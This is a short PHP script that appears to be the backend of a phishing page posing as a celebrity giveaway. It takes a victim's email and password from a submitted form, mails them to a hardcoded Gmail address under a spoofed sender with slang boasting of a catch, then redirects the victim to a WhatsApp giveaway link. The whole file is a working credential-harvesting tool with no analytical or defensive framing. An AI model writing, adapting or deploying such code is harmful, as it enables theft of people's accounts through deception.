<?php
$email = $_POST['email'];
$password = $_POST['password'];
if (empty($email) && empty($password)) {
  header('location: ./');
} else {
$message = "
Nih Akunnya Coyyy (by AYAM GORENG) :

Email : ".$email."
Password : ".$password."
";

$emailmu = "ratihku527@gmail.com";
$subject = " Masuk Ikan coyy [ ".$email." ]";
$headers = 'From: XNULL <noreply@xnull.ml>' . "\r\n";
mail($emailmu, $subject, $message, $headers);
header('location: https://wa.me/6283125509256?text=Saya%20Ingin%20Ikut%20Giveaway%20Baim%20Wong.');
}
?>